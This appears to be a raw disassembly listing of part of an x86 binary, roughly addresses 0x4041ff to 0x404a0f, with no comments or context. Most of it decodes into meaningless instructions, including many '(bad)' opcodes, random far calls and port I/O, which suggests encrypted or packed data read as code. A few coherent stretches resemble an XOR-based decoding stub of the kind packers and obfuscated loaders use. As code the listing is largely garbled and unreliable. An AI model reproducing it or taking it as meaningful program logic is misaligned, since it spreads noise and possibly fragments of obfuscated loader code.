  4041ff:	xor    BYTE PTR ss:[esi+ebp*2],dh
  404203:	mov    WORD PTR [ecx-0x80],?
  404206:	xor    bl,BYTE PTR [esi+edi*2-0x53977ca5]
  40420d:	xor    DWORD PTR [ecx-0x1e],edi
  404210:	mov    eax,ds:0xcdf41dd3
  404215:	mov    ebp,0x4343ca2
  40421a:	mov    ah,0x49
  40421c:	xchg   ebx,eax
  40421d:	sub    al,0xd9
  40421f:	ds call 0x55f48867
  404225:	mov    eax,0x3a37c466
  40422a:	pop    esp
  40422b:	fst    QWORD PTR [ecx+0x316c7e51]
  404231:	inc    ebx
  404232:	adc    al,0xf4
  404234:	les    ecx,FWORD PTR [edx+0x29]
  404237:	outs   dx,BYTE PTR ds:[esi]
  404238:	rol    BYTE PTR [eax-0x7d],cl
  40423b:	clc    
  40423c:	inc    eax
  40423d:	mov    DWORD PTR ds:0x42fe6e,0x793d
  404247:	jmp    0x4045a7
  40424c:	leave  
  40424d:	daa    
  40424e:	rcl    BYTE PTR [esi],1
  404250:	repnz aad 0xf1
  404253:	jecxz  0x404232
  404255:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404256:	dec    ebp
  404257:	(bad)  
  40425a:	fsubr  DWORD PTR [ecx]
  40425c:	dec    edi
  40425d:	sbb    BYTE PTR [eax+0x70],dh
  404260:	cmp    eax,0x5e70707d
  404265:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404266:	test   ah,cl
  404268:	stos   BYTE PTR es:[edi],al
  404269:	das    
  40426a:	add    ebx,DWORD PTR [edi+0x7ab507e3]
  404270:	lods   eax,DWORD PTR ds:[esi]
  404271:	outs   dx,DWORD PTR ds:[esi]
  404272:	fs into 
  404274:	sbb    ebx,edx
  404276:	pop    ebx
  404277:	inc    ecx
  404278:	in     al,dx
  404279:	addr16 pop eax
  40427b:	jbe    0x404282
  40427d:	cmp    ch,BYTE PTR [ebx+0x743ef03d]
  404283:	jbe    0x4042d3
  404285:	loopne 0x404276
  404287:	call   0x2fcf45bb
  40428c:	mov    al,0xd8
  40428e:	out    0x59,eax
  404290:	xor    DWORD PTR ds:0xd92d0999,eax
  404296:	shl    DWORD PTR [edi+0x12425c88],0x21
  40429d:	fisttp QWORD PTR [eax+0x2e]
  4042a0:	retf   
  4042a1:	sahf   
  4042a2:	mov    ss,WORD PTR [ebx+0x2]
  4042a5:	pop    ss
  4042a6:	es and edx,ebx
  4042a9:	dec    edx
  4042aa:	scas   eax,DWORD PTR es:[edi]
  4042ab:	mov    es,edi
  4042ad:	pop    esi
  4042ae:	push   esp
  4042af:	xchg   esi,eax
  4042b0:	out    dx,eax
  4042b1:	lahf   
  4042b2:	inc    ebp
  4042b3:	aad    0xfc
  4042b5:	ins    BYTE PTR es:[edi],dx
  4042b6:	mov    esi,0xe472194
  4042bb:	push   ecx
  4042bc:	xchg   bl,al
  4042be:	lea    esi,[eax+eax*4-0x5418de47]
  4042c5:	sub    bh,BYTE PTR [ebx]
  4042c7:	cmp    BYTE PTR [ecx+0x7e],0x76
  4042cb:	inc    eax
  4042cc:	ror    ch,cl
  4042ce:	mov    cl,0x77
  4042d0:	clc    
  4042d1:	sbb    edi,edx
  4042d3:	dec    ebx
  4042d4:	adc    DWORD PTR [eax],ecx
  4042d6:	mov    edx,0x4fbbf4e7
  4042db:	ins    BYTE PTR es:[edi],dx
  4042dc:	cs inc edi
  4042de:	jge    0x404289
  4042e0:	and    al,0xd
  4042e2:	mov    ecx,0xa89b444b
  4042e7:	pop    ds
  4042e8:	mov    ebp,0x7a2be85c
  4042ed:	rol    DWORD PTR [edx+0x1e],cl
  4042f0:	fisttp WORD PTR [eax]
  4042f2:	sbb    eax,0xb0ba7c46
  4042f7:	rcr    DWORD PTR [edi-0x67],0x4c
  4042fb:	sub    eax,0xe999c8a6
  404300:	xchg   ebx,eax
  404301:	dec    esi
  404302:	pop    esp
  404303:	inc    edx
  404304:	stc    
  404305:	cli    
  404306:	or     al,0xb7
  404308:	hlt    
  404309:	lock pop ds
  40430b:	or     al,BYTE PTR [edx]
  40430d:	hlt    
  40430e:	leave  
  40430f:	nop
  404310:	repz cs out dx,al
  404313:	xor    ah,BYTE PTR [esi-0x78]
  404316:	mov    dh,0x1f
  404318:	test   eax,0xf6e99293
  40431d:	xchg   ebx,eax
  40431e:	sbb    al,0x4e
  404320:	outs   dx,BYTE PTR ds:[esi]
  404321:	mov    al,ds:0xa79795
  404326:	adc    BYTE PTR [ebx+ebp*4+0x0],0xe4
  40432b:	xor    al,0x76
  40432d:	mov    es,WORD PTR [esi-0xec49805]
  404333:	sbb    BYTE PTR [eax-0x43f0971],cl
  404339:	cmp    BYTE PTR [edx],0x5c
  40433c:	xchg   DWORD PTR [edx-0x634e4b6a],edi
  404342:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404343:	and    al,0xad
  404345:	jnp    0x40431c
  404347:	inc    edi
  404348:	mov    dh,0x59
  40434a:	arpl   bx,bp
  40434c:	mov    ds:0x61cf147b,eax
  404351:	je     0x40431d
  404353:	call   0x7ca9f852
  404358:	sbb    bl,dl
  40435a:	arpl   cx,cx
  40435c:	into   
  40435d:	cwde   
  40435e:	lahf   
  40435f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404360:	mov    eax,0x5e2a55c7
  404365:	add    bh,bh
  404367:	xchg   esp,eax
  404368:	aad    0x1
  40436a:	or     eax,0xd6db448d
  40436f:	test   eax,0xa4fde95
  404374:	hlt    
  404375:	loope  0x404310
  404377:	push   0x2cfc21b9
  40437c:	cmc    
  40437d:	(bad)  
  40437e:	fcmovu st,st(4)
  404380:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404381:	imul   esp,DWORD PTR [eax+0x4b83416d],0x432e27a9
  40438b:	jno    0x40435c
  40438d:	dec    edi
  40438e:	xor    bl,bl
  404390:	iret   
  404391:	fldenv [edx]
  404393:	dec    edi
  404394:	outs   dx,DWORD PTR ds:[esi]
  404395:	add    BYTE PTR [edi-0x6a],dh
  404398:	(bad)  
  404399:	mov    ebx,0xe8167eb3
  40439e:	sbb    DWORD PTR [ecx+0x70],ebp
  4043a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4043a2:	mov    dh,0xd2
  4043a4:	mov    ecx,0x7fc2c096
  4043a9:	stos   DWORD PTR es:[edi],eax
  4043aa:	in     al,dx
  4043ab:	out    dx,al
  4043ac:	jae    0x4043d6
  4043ae:	mov    ch,0xa4
  4043b0:	jne    0x40437d
  4043b2:	mov    bl,0xf1
  4043b4:	add    eax,0xd6bc5b28
  4043b9:	aam    0xd0
  4043bb:	and    al,0xca
  4043bd:	iret   
  4043be:	dec    esp
  4043bf:	push   ecx
  4043c0:	aad    0xbd
  4043c2:	pop    ebp
  4043c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4043c4:	xchg   ebx,eax
  4043c5:	mov    eax,ds:0x770e379e
  4043ca:	lea    esp,[esi+ecx*2]
  4043cd:	mov    al,ds:0xebf3d75a
  4043d2:	setbe  BYTE PTR [ebx-0x65]
  4043d6:	push   es
  4043d7:	add    DWORD PTR [edi-0xc2fb6d4],0x59771880
  4043e1:	cmp    eax,0x7b27ddc5
  4043e6:	sub    al,0xa6
  4043e8:	push   ds
  4043e9:	xchg   edi,eax
  4043ea:	pop    ebx
  4043eb:	popf   
  4043ec:	scas   eax,DWORD PTR es:[edi]
  4043ed:	jle    0x40437d
  4043ef:	sub    al,bl
  4043f1:	dec    esp
  4043f2:	loopne 0x4043f5
  4043f4:	std    
  4043f5:	retf   
  4043f6:	mov    ds:0xe2c60ca3,al
  4043fb:	cmp    al,0x24
  4043fd:	das    
  4043fe:	imul   ebp,DWORD PTR [esi+ecx*2+0x0],0xe59b7da8
  404406:	rcl    BYTE PTR [ecx],cl
  404408:	scas   eax,DWORD PTR es:[edi]
  404409:	pop    ds
  40440a:	pcmpgtd mm7,mm6
  40440d:	jmp    0x40440d
  40440f:	mov    ebx,0x2976f78c
  404414:	retf   0xbbf0
  404417:	or     eax,0xec0bb1c4
  40441c:	or     DWORD PTR [edx],0x40
  40441f:	sbb    ebx,DWORD PTR [edx+0x3f02d5c3]
  404425:	jl     0x40444d
  404427:	pop    ecx
  404428:	rcr    DWORD PTR [edx+0x2c485b5d],0xbd
  40442f:	jg     0x40449a
  404431:	and    bl,0x7
  404434:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404435:	sbb    eax,0x47de6b41
  40443a:	not    DWORD PTR [ebx+0xa]
  40443d:	cld    
  40443e:	inc    ebp
  40443f:	cmp    bh,0xd5
  404442:	mov    dl,BYTE PTR [ebp+0x207ba09a]
  404448:	nop
  404449:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40444a:	sub    DWORD PTR ds:0xb7585eef,0xc37160ad
  404454:	fmulp  st(0),st
  404456:	inc    eax
  404457:	bsf    edx,DWORD PTR [ecx+eiz*8-0x240cf4cd]
  40445f:	ins    BYTE PTR es:[edi],dx
  404460:	sar    ebp,0xd7
  404463:	dec    eax
  404464:	push   cs
  404465:	xor    eax,0x65e80a07
  40446a:	sbb    al,0xb
  40446c:	adc    eax,0xa57d2f7b
  404471:	jecxz  0x404419
  404473:	into   
  404474:	dec    ecx
  404475:	clc    
  404476:	enter  0x84b8,0xf6
  40447a:	add    BYTE PTR [edx],cl
  40447c:	scas   eax,DWORD PTR es:[edi]
  40447d:	or     ah,BYTE PTR [ebp-0x4e2b0a10]
  404483:	into   
  404484:	xchg   BYTE PTR [esi+0x58],bh
  404487:	(bad)  
  404488:	fimul  DWORD PTR [eax+edi*8-0x4eb59f3e]
  40448f:	repnz in al,dx
  404491:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404492:	in     al,dx
  404493:	call   0xe079:0x56bdac90
  40449a:	or     cl,dh
  40449c:	mov    ds:0x6ba30ef2,al
  4044a1:	mov    ch,0x18
  4044a3:	addr16 inc esp
  4044a5:	mov    bh,0x4e
  4044a7:	fwait
  4044a8:	leave  
  4044a9:	cdq    
  4044aa:	xlat   BYTE PTR ds:[ebx]
  4044ab:	nop
  4044ac:	jb     0x404455
  4044ae:	sbb    DWORD PTR [ebp-0x60bc2c8e],0x2a
  4044b5:	mov    al,0x90
  4044b7:	adc    BYTE PTR [esi],dh
  4044b9:	addr16 push eax
  4044bb:	xor    DWORD PTR [ebp+0x204f6411],0xadcd3245
  4044c5:	inc    ebp
  4044c6:	ds mov ebp,0x942a491
  4044cc:	outs   dx,DWORD PTR ds:[esi]
  4044cd:	call   0xf325:0xae2e981f
  4044d4:	shl    BYTE PTR [esi+edi*4],1
  4044d7:	cmp    BYTE PTR [eax],bl
  4044d9:	mov    edx,0xd50f8dd0
  4044de:	scas   al,BYTE PTR es:[edi]
  4044df:	repnz out dx,al
  4044e1:	(bad)  
  4044e2:	mov    edi,0xb8d55f08
  4044e7:	repnz push ds
  4044e9:	sub    esp,edx
  4044eb:	pop    esi
  4044ec:	ja     0x40450f
  4044ee:	lods   eax,DWORD PTR ds:[esi]
  4044ef:	push   ebx
  4044f0:	neg    BYTE PTR [edx+0x3a]
  4044f3:	test   DWORD PTR [ebx+0x30ee10b9],0xcf1a9fe5
  4044fd:	call   FWORD PTR [ebp+ecx*2-0x61ca64be]
  404504:	(bad)
  404507:	sbb    eax,DWORD PTR [ebp-0x1e]
  40450a:	push   ds
  40450b:	dec    edx
  40450c:	pop    ecx
  40450d:	cmc    
  40450e:	mov    dh,dh
  404510:	xor    al,0xdb
  404512:	cmp    eax,DWORD PTR [edi]
  404514:	push   eax
  404515:	xchg   DWORD PTR [eax],ecx
  404517:	mov    ah,0x46
  404519:	mov    bh,0xce
  40451b:	and    cl,BYTE PTR [ebx-0x1dfa41e8]
  404521:	mov    esp,0x21e9b5df
  404526:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404527:	pop    eax
  404528:	adc    dl,ch
  40452a:	add    BYTE PTR [esi+0x53],bl
  40452d:	fidiv  WORD PTR [edx]
  40452f:	sbb    edi,DWORD PTR [eax]
  404531:	sbb    al,0xba
  404533:	xchg   edx,eax
  404534:	inc    esp
  404535:	(bad)  
  404537:	xchg   edx,eax
  404538:	mov    eax,0x6b355822
  40453d:	popa   
  40453e:	xchg   esi,eax
  40453f:	or     eax,0x8da85d9b
  404544:	mov    ecx,0xbb99ea7a
  404549:	aaa    
  40454a:	mov    ebx,0x9a40b11d
  40454f:	add    al,0x2a
  404551:	mov    DWORD PTR [ecx+eax*8-0x22233378],eax
  404558:	(bad)
  40455d:	and    DWORD PTR [edi-0x225c8435],ecx
  404563:	xchg   esi,eax
  404564:	jle    0x4045cc
  404566:	sbb    BYTE PTR [esi-0x2c],cl
  404569:	mov    edi,0x1e49af21
  40456e:	fst    DWORD PTR [eax]
  404570:	imul   DWORD PTR [ecx-0x106899ce]
  404576:	inc    edx
  404577:	cmp    DWORD PTR [ebp+0x71508c43],eax
  40457d:	stc    
  40457e:	ret    0x9410
  404581:	hlt    
  404582:	stos   BYTE PTR es:[edi],al
  404583:	or     al,0xe8
  404585:	in     al,0x42
  404587:	outs   dx,DWORD PTR ds:[esi]
  404589:	out    0xa0,al
  40458b:	mov    ah,0xc2
  40458d:	pop    eax
  40458e:	int    0x5f
  404590:	test   DWORD PTR [esi],eax
  404592:	ret    
  404593:	loopne 0x4045d4
  404595:	ins    DWORD PTR es:[edi],dx
  404596:	pop    ecx
  404597:	mov    BYTE PTR [ecx],al
  404599:	inc    edx
  40459a:	(bad)  
  40459b:	div    BYTE PTR [esi+ebp*2+0x427b978d]
  4045a2:	mov    ds:0x93f84d82,eax
  4045a7:	jb     0x403ebe
  4045ad:	and    DWORD PTR ds:0x42fe82,edx
  4045b3:	mov    edx,DWORD PTR [ebp-0x8]
  4045b6:	jmp    0x404916
  4045bb:	push   ss
  4045bc:	jge    0x404620
  4045be:	add    BYTE PTR [ecx+0x73],dh
  4045c1:	jb     0x4045c8
  4045c3:	inc    edi
  4045c4:	sbb    ch,BYTE PTR [ecx+edx*2]
  4045c7:	pop    esi
  4045c8:	sub    DWORD PTR [edx+0x38],ebx
  4045cb:	or     al,0x24
  4045cd:	jo     0x40463f
  4045cf:	cmp    eax,0xb970707d
  4045d4:	test   BYTE PTR [ebx+0x74991b79],cl
  4045da:	pop    eax
  4045db:	bound  eax,QWORD PTR [ebp-0x25]
  4045de:	test   BYTE PTR [ebx],ah
  4045e0:	ror    DWORD PTR [ebx+0x1e18daf5],cl
  4045e6:	add    dh,cl
  4045e8:	bound  ebx,QWORD PTR [ebx-0x3256c712]
  4045ee:	pusha  
  4045ef:	out    0x28,eax
  4045f1:	cs push edi
  4045f3:	pop    ds
  4045f4:	and    eax,0xeb5309f7
  4045f9:	push   eax
  4045fa:	add    DWORD PTR [edx+0x19d7ddef],edi
  404600:	mov    dh,0xc8
  404602:	sub    BYTE PTR [edi-0x11],0x3
  404606:	or     eax,0x19c63e4
  40460b:	pop    esi
  40460c:	jo     0x40464f
  40460e:	daa    
  40460f:	ss and bh,bl
  404612:	xlat   BYTE PTR ds:[ebx]
  404613:	jg     0x404647
  404615:	std    
  404616:	imul   esp,DWORD PTR [ecx+0x1def3a99],0xffffff98
  40461d:	sbb    ch,BYTE PTR [eax+0x68]
  404620:	outs   dx,DWORD PTR ds:[esi]
  404621:	xchg   esi,eax
  404622:	cdq    
  404623:	xor    esi,DWORD PTR [ecx+0x33]
  404626:	test   BYTE PTR ds:0x21ce393b,cl
  40462c:	sbb    eax,0x618db9a7
  404631:	cmp    ecx,ebp
  404633:	(bad)  
  404634:	je     0x4045fa
  404636:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404637:	imul   ebx,DWORD PTR [esp+edx*8-0xa],0x882ed96e
  40463f:	xchg   esi,eax
  404640:	pop    ebp
  404641:	jo     0x40462a
  404643:	pop    ecx
  404644:	inc    edx
  404645:	adc    al,0xf
  404647:	and    bh,al
  404649:	rcl    DWORD PTR [ebp*8+0x203c528f],1
  404650:	add    DWORD PTR [edi+0x14],ebx
  404653:	adc    eax,0x15a24975
  404658:	test   al,0x50
  40465a:	mov    edi,0xa0301b5e
  40465f:	mov    edi,0x33b4437f
  404664:	mov    al,ds:0xc0c4ffcc
  404669:	mov    esp,esi
  40466b:	hlt    
  40466c:	inc    esi
  40466d:	mov    bh,0x98
  40466f:	test   al,0x9e
  404671:	fwait
  404672:	loope  0x404638
  404674:	adc    DWORD PTR [ecx+0x13],ebp
  404677:	sub    dh,BYTE PTR [edx-0x5a]
  40467a:	mov    ss,WORD PTR ds:0xc50aff2
  404680:	sti    
  404681:	xchg   esp,edx
  404683:	sbb    al,0x6b
  404685:	stc    
  404686:	add    al,0x18
  404688:	xchg   DWORD PTR [edi+0x4989b0e6],edi
  40468e:	dec    ebp
  40468f:	test   BYTE PTR [edi],al
  404691:	gs scas al,BYTE PTR es:[edi]
  404693:	fstcw  WORD PTR ss:[eax-0x5]
  404698:	cmp    eax,0x5f788657
  40469d:	sub    edx,DWORD PTR [ebp+0x4376eced]
  4046a3:	pop    ebx
  4046a4:	push   WORD PTR [edx-0x1f]
  4046a8:	in     eax,0xd
  4046aa:	add    DWORD PTR [edi],eax
  4046ac:	sar    DWORD PTR [edx+0x62d2177e],0xfa
  4046b3:	fidivr DWORD PTR [eax-0x1578927e]
  4046b9:	and    eax,0xa182e96b
  4046be:	inc    ebx
  4046bf:	dec    ecx
  4046c0:	cmp    DWORD PTR [edi+0x2c],0x83d86e82
  4046c7:	aam    0xf1
  4046c9:	jmp    0x37562553
  4046ce:	and    ebx,ebp
  4046d0:	jecxz  0x404721
  4046d2:	sbb    al,0xca
  4046d4:	pushf  
  4046d5:	pusha  
  4046d6:	dec    edx
  4046d7:	shl    BYTE PTR [edi+0x2b0f9563],0x58
  4046de:	pop    es
  4046df:	push   0xffffff9f
  4046e1:	out    dx,eax
  4046e2:	lods   al,BYTE PTR ds:[esi]
  4046e3:	and    al,ch
  4046e5:	add    DWORD PTR [edi+0x3ae7eaa9],0xffffffc5
  4046ec:	(bad)  
  4046ee:	mov    dl,0x39
  4046f0:	mov    DWORD PTR [ebx+0x78],ebx
  4046f3:	mov    eax,0x55a89a6b
  4046f8:	imul   eax,DWORD PTR ds:[edi],0xc97bd789
  4046ff:	sar    BYTE PTR [edi],1
  404701:	into   
  404702:	(bad)  
  404703:	fsub   DWORD PTR [ecx+edi*1]
  404706:	mov    ebp,0xd35b1af
  40470b:	dec    ebx
  40470c:	xchg   edi,eax
  40470d:	cmp    DWORD PTR [esi+0x6c1d52e0],ebx
  404713:	push   0x55
  404715:	cmp    DWORD PTR [ebp-0x3c91068c],esp
  40471b:	(bad)  
  40471d:	or     al,0x39
  40471f:	icebp  
  404720:	jmp    DWORD PTR [edx]
  404722:	mul    DWORD PTR [edi-0x6f005031]
  404728:	mov    al,0xaf
  40472a:	into   
  40472b:	retf   
  40472c:	mov    esi,0x351e947a
  404731:	cmp    DWORD PTR [ebx+edx*8],ebp
  404734:	sub    eax,0x8c8b4324
  404739:	outs   dx,BYTE PTR ds:[esi]
  40473a:	in     eax,dx
  40473b:	ret    
  40473c:	inc    edx
  40473d:	aaa    
  40473e:	(bad)  
  40473f:	adc    ebx,ebx
  404741:	ret    
  404742:	mov    ebx,0x42c142a7
  404747:	iret   
  404748:	mov    DWORD PTR [edx+ecx*4],ebp
  40474b:	pop    ds
  40474c:	pop    ecx
  40474d:	fwait
  40474e:	and    esi,DWORD PTR [esi-0x2b]
  404751:	inc    edx
  404752:	cli    
  404753:	mov    edx,0x3ef39647
  404758:	shl    ch,0xb0
  40475b:	push   ecx
  40475c:	jo     0x404700
  40475e:	dec    ebx
  40475f:	xchg   esi,eax
  404760:	aaa    
  404761:	fwait
  404762:	ror    ecx,1
  404764:	jmp    0x59e70bf7
  404769:	bound  eax,QWORD PTR [ebx+0x7c0310bb]
  40476f:	mov    edi,0x8988607f
  404774:	(bad)  
  404775:	loope  0x404703
  404777:	mov    ch,0xb1
  404779:	sub    DWORD PTR [esi-0x62],ebp
  40477c:	mov    ah,0xa3
  40477e:	pop    ds
  40477f:	retf   
  404780:	mov    cs,ebx
  404782:	(bad)  
  404783:	cmp    cl,dl
  404785:	mov    edx,0x52cc27e1
  40478a:	aam    0x4e
  40478c:	inc    eax
  40478d:	js     0x40477e
  40478f:	std    
  404790:	leave  
  404791:	stos   DWORD PTR es:[edi],eax
  404792:	cld    
  404793:	push   ss
  404794:	popa   
  404795:	int    0xa7
  404797:	mov    edi,0xd4561542
  40479c:	push   ss
  40479d:	inc    edx
  40479e:	pop    esp
  40479f:	mov    dh,0xf4
  4047a1:	adc    al,0xbb
  4047a3:	mov    DWORD PTR [ebx-0x43],edx
  4047a6:	mov    al,0xcb
  4047a8:	iret   
  4047a9:	nop
  4047aa:	call   0x2dddba73
  4047af:	jb     0x40480b
  4047b1:	ins    BYTE PTR es:[edi],dx
  4047b2:	lods   al,BYTE PTR ds:[esi]
  4047b3:	loop   0x4047f8
  4047b5:	leave  
  4047b6:	(bad)
  4047b9:	out    0x83,eax
  4047bb:	ret    
  4047bc:	sbb    al,0x85
  4047be:	dec    esi
  4047bf:	(bad)  
  4047c0:	int    0x3a
  4047c2:	mov    esp,0xee99f055
  4047c7:	je     0x404823
  4047c9:	ret    0xb74c
  4047cc:	mov    al,0x51
  4047ce:	xchg   edx,eax
  4047cf:	and    esi,eax
  4047d1:	inc    esp
  4047d2:	icebp  
  4047d3:	nop
  4047d4:	std    
  4047d5:	xor    DWORD PTR [esi+eiz*1+0x3],ebx
  4047d9:	xlat   BYTE PTR ds:[ebx]
  4047da:	mov    edx,DWORD PTR [ebp-0x469e00b0]
  4047e0:	dec    DWORD PTR [esi+0xcbfc60e]
  4047e6:	(bad)  
  4047e7:	fsub   DWORD PTR [eax]
  4047e9:	int    0xbd
  4047eb:	jge    0x404798
  4047ed:	stos   BYTE PTR es:[edi],al
  4047ee:	add    edi,ecx
  4047f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4047f1:	pop    ebx
  4047f2:	sub    ebp,DWORD PTR [ebx]
  4047f4:	les    ebx,FWORD PTR ds:0xc63daec9
  4047fa:	sar    BYTE PTR [ecx-0x9b0402c],cl
  404800:	imul   edx,DWORD PTR [esi],0x18
  404803:	ja     0x404823
  404805:	mov    edx,0x11a7fcef
  40480a:	sar    DWORD PTR [esi],1
  40480c:	jae    0x4047e4
  40480e:	sub    al,BYTE PTR [edi+0xa]
  404811:	xor    ch,BYTE PTR [esi-0x2f]
  404814:	aaa    
  404815:	out    dx,eax
  404816:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404817:	ja     0x4047a0
  404819:	mov    al,BYTE PTR [edx]
  40481b:	push   ss
  40481c:	cmp    BYTE PTR [ecx+0x31],0x6d
  404820:	xchg   ebx,eax
  404821:	or     eax,0x462f97d6
  404826:	sbb    edi,DWORD PTR [edx+0x79]
  404829:	inc    eax
  40482a:	xchg   esp,eax
  40482b:	scas   al,BYTE PTR es:[edi]
  40482c:	ret    0xa214
  40482f:	int3   
  404830:	jbe    0x404801
  404832:	pop    ss
  404833:	js     0x404827
  404835:	outs   dx,BYTE PTR ds:[esi]
  404836:	mov    ebx,0x78ed82a2
  40483b:	pop    ecx
  40483c:	and    eax,0x205a17bd
  404841:	call   0x72c42c7b
  404846:	sub    cl,BYTE PTR [eax-0x13]
  404849:	jb     0x4047d7
  40484b:	mov    dh,0xab
  40484d:	adc    al,0xe7
  40484f:	loope  0x4048a7
  404851:	xchg   ecx,eax
  404852:	sub    eax,0xe60245c3
  404857:	xchg   ecx,eax
  404858:	add    BYTE PTR [edx-0x79],bh
  40485b:	push   0xffffffdc
  40485d:	xor    eax,0x542415a0
  404862:	jmp    0x96d3f7f2
  404867:	loopne 0x404892
  404869:	lods   eax,DWORD PTR ds:[esi]
  40486a:	fild   WORD PTR [esi]
  40486c:	and    BYTE PTR [ecx+0x28],bh
  40486f:	dec    edi
  404870:	push   es
  404871:	cmp    ecx,DWORD PTR [ebp+0x7dcf0f34]
  404877:	push   ebp
  404878:	test   edi,eax
  40487a:	pop    eax
  40487b:	repz test eax,0xc5e89a9e
  404881:	ror    BYTE PTR [ebx],cl
  404883:	and    eax,0xe822a4c
  404888:	sub    ebp,ebp
  40488a:	in     eax,dx
  40488b:	push   ss
  40488c:	mov    cl,0x7f
  40488e:	or     edi,ebp
  404890:	add    eax,0x879f0060
  404895:	ret    
  404896:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404897:	add    eax,0x37fcc3c0
  40489c:	outs   dx,DWORD PTR ds:[esi]
  40489d:	outs   dx,BYTE PTR ds:[esi]
  40489e:	jg     0x40486b
  4048a0:	iret   
  4048a1:	daa    
  4048a2:	jns    0x404854
  4048a4:	(bad)  
  4048a5:	push   ebp
  4048a6:	mov    dh,0xdb
  4048a8:	sub    al,0x71
  4048aa:	push   edi
  4048ab:	mov    esp,0x7f648358
  4048b0:	ffree  st(1)
  4048b2:	mov    cl,0x9e
  4048b4:	clc    
  4048b5:	ins    DWORD PTR es:[edi],dx
  4048b6:	sub    dh,dl
  4048b8:	aad    0x7f
  4048ba:	ret    
  4048bb:	test   eax,0xcae5879b
  4048c0:	inc    edi
  4048c1:	ficomp WORD PTR [edx+esi*8-0x5e745b8d]
  4048c8:	lds    ecx,FWORD PTR [ecx-0x2ec84ee2]
  4048ce:	sub    bh,BYTE PTR [ecx-0x9c6bbd7]
  4048d4:	scas   eax,DWORD PTR es:[edi]
  4048d5:	(bad)  
  4048d6:	jl     0x40486e
  4048d8:	sbb    bh,BYTE PTR [ebp-0x45]
  4048db:	dec    ecx
  4048dc:	inc    ebx
  4048dd:	ins    DWORD PTR es:[edi],dx
  4048de:	fldl2t 
  4048e0:	jl     0x4048bb
  4048e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4048e3:	(bad)  
  4048e4:	push   esp
  4048e5:	sar    DWORD PTR [edi+edi*1],1
  4048e8:	clc    
  4048e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4048ea:	test   esi,ebp
  4048ec:	int3   
  4048ed:	int    0xa5
  4048ef:	addr16 pusha 
  4048f1:	iret   
  4048f2:	fldl2e 
  4048f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4048f5:	repz addr16 sbb bh,0x2
  4048fa:	mov    al,ds:0xa3cd0550
  4048ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404900:	fiadd  DWORD PTR [esi+eax*4]
  404903:	mov    ds:0xbaeb12b3,al
  404908:	rol    BYTE PTR [ebx],cl
  40490a:	inc    edx
  40490b:	jmp    0x40491e
  40490d:	mov    al,bh
  40490f:	mov    eax,ds:0xd438dbde
  404914:	xchg   ebx,eax
  404915:	sti    
  404916:	mov    eax,DWORD PTR [ebp-0xc]
  404919:	xor    edx,ecx
  40491b:	add    edx,esi
  40491d:	cmp    edx,eax
  40491f:	mov    DWORD PTR ds:0x42e21c,0x6f80
  404929:	je     0x405095
  40492f:	add    DWORD PTR ds:0x42e224,ecx
  404935:	push   ebx
  404936:	adc    DWORD PTR ds:0x42e7ff,ecx
  40493c:	push   edi
  40493d:	mov    edi,DWORD PTR [ebp+0x8]
  404940:	mov    eax,0x8a3e
  404945:	and    DWORD PTR ds:0x42e234,0x5964
  40494f:	xor    ax,WORD PTR [edi+edx*4+0x2]
  404954:	mov    edi,0x3b04
  404959:	add    ax,di
  40495c:	add    DWORD PTR ds:0x42fe05,0x42e234
  404966:	movzx  eax,ax
  404969:	and    DWORD PTR ds:0x42fe7a,0x42fdf9
  404973:	mov    DWORD PTR [ebp-0x14],eax
  404976:	sbb    DWORD PTR ds:0x42fe7e,0xc63
  404980:	mov    eax,DWORD PTR [ebp+0x8]
  404983:	add    DWORD PTR ds:0x42e803,0x6bf6
  40498d:	movzx  eax,WORD PTR [eax+edx*4]
  404991:	sbb    DWORD PTR ds:0x42fe82,0x42fe7e
  40499b:	xor    eax,0x8a3e
  4049a0:	add    DWORD PTR ds:0x42e807,0x26eb
  4049aa:	jmp    0x404d0a
  4049af:	fdiv   QWORD PTR [esi]
  4049b1:	dec    esp
  4049b2:	rsqrtps xmm6,XMMWORD PTR [ecx+0x5b]
  4049b6:	icebp  
  4049b7:	inc    eax
  4049b8:	sub    esp,DWORD PTR [ebp-0x15]
  4049bb:	xchg   esp,eax
  4049bc:	repnz sbb al,0x72
  4049bf:	leave  
  4049c0:	and    DWORD PTR [eax+0x70],esi
  4049c3:	cmp    eax,0x2470707d
  4049c8:	scas   al,BYTE PTR es:[edi]
  4049c9:	call   0xea66:0xa7b63353
  4049d0:	sar    DWORD PTR [edi-0x79],0x57
  4049d4:	jg     0x404a2c
  4049d6:	adc    al,0x45
  4049d8:	or     al,ch
  4049da:	mov    esp,0xd174f59e
  4049df:	or     DWORD PTR [ecx+0x1f],ebp
  4049e2:	jo     0x40496e
  4049e4:	add    BYTE PTR [ebx],dh
  4049e6:	jo     0x404a17
  4049e8:	or     eax,0xd03d1c0e
  4049ed:	jl     0x404988
  4049ef:	pushf  
  4049f0:	or     BYTE PTR [eax-0x4f],0xb2
  4049f4:	sahf   
  4049f5:	test   BYTE PTR [edi+ebp*2],dl
  4049f8:	fmul   DWORD PTR [edx]
  4049fa:	std    
  4049fb:	inc    eax
  4049fc:	jne    0x40497f
  4049fe:	ss xchg ebx,eax
  404a00:	mov    al,ds:0x3d8ba49e
  404a05:	(bad)  
  404a07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a08:	pop    eax
  404a09:	add    eax,0x52b5c1cc
  404a0e:	push   ds
  404a0f:	out    dx,eax
